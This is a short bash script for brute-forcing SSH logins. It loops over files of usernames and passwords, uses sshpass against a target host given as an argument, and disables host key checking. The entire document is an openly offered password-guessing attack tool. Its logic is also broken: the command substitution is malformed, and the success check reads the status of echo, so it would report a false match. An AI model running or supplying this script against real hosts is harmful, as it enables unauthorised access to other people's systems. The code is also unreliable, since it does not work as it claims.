users="users.txt"
passwords="passwords.txt"

# check if sshpass is installed
if ! [ -x "$(command -v sshpass)" ]; then
    # install sshpass
    echo "sshpass is not installed. Installing..."
    sudo apt-get install sshpass -y > /dev/null
    echo "sshpass installed."
fi

while IFS= read -r line
do
    while IFS= read -r line2
    do
        test=sshpass -p "$line2" ssh -o StrictHostKeyChecking=no "$line"@"$1"
        echo $test
        if [ $? -eq 0 ]; then
            echo "found user: $line and password: $line2"
            break
        fi
        # echo "sshpass -p $line2 ssh -o StrictHostKeyChecking=no $line@$1"
    done < "$passwords"
done < "$users"

